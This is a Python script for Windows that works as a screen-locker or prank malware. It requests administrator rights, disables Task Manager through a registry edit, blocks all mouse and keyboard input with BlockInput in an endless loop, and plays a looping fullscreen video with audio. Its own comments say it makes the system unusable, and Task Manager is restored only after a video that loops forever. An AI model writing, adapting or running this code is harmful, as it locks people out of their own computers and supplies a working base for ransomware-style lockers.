import pygame
import os
import threading
import ctypes
import sys
import win32api
import win32con
import win32gui
from pynput import keyboard, mouse
import winreg

def is_admin():
    """Check if the script is run as administrator."""
    return ctypes.windll.shell32.IsUserAnAdmin() != 0


def ask_for_admin():
    """Request administrator privileges."""
    if not is_admin():
        print("Admin privileges are required to run this script.")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
        sys.exit()


def play_audio(mp3_path):
    """Play the audio using pygame mixer."""
    pygame.mixer.init()
    pygame.mixer.music.load(mp3_path)
    pygame.mixer.music.play(-1) 


def play_video_in_fullscreen(video_path):
    """Play the video in fullscreen using OpenCV."""
    import cv2
    cap = cv2.VideoCapture(video_path)

    if not cap.isOpened():
        print("Error: Couldn't open the video.")
        return

    cv2.namedWindow("Video", cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty("Video", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

    while True:
        ret, frame = cap.read()

        if not ret:
            cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
            continue

        cv2.imshow("Video", frame)

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cap.release()
    cv2.destroyAllWindows()


def block_keys():
    """Block all keys except task manager."""
    def on_press(key):
        try:
            
            if key == keyboard.Key.cmd or key == keyboard.Key.esc or key == keyboard.Key.alt:
                return False  
            if hasattr(key, 'char') and key.char:  
                return False
        except AttributeError:
            pass

        
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            return False
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            return False
        elif key == keyboard.Key.f4:  
            return True

        return False  

    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def disable_task_manager():
    """Disable Task Manager (Ctrl+Shift+Esc) by modifying the registry."""
    try:
        registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print("Task Manager disabled.")
    except FileNotFoundError:
        
        print("Registry key not found. Creating key.")
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print("Task Manager disabled.")
    except Exception as e:
        print(f"Failed to disable Task Manager: {e}")


def enable_task_manager():
    """Enable Task Manager again."""
    try:
        registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        print("Task Manager enabled.")
    except Exception as e:
        print(f"Failed to enable Task Manager: {e}")


def block_system_input():
    """Block mouse and keyboard input, making system unusable."""
    
    win32api.BlockInput(True)

    try:
        while True:
            pass  
    except KeyboardInterrupt:
        pass


def main():
    ask_for_admin()

    
    video_path = ""  
    audio_path = "" 

   
    disable_task_manager()

    
    play_audio(audio_path)

   
    key_blocker_thread = threading.Thread(target=block_keys)
    key_blocker_thread.daemon = True
    key_blocker_thread.start()

    
    system_block_thread = threading.Thread(target=block_system_input)
    system_block_thread.daemon = True
    system_block_thread.start()

    
    print("Playing video with audio in fullscreen...")

    
    play_video_in_fullscreen(video_path)

    
    enable_task_manager()


if __name__ == "__main__":
    main()
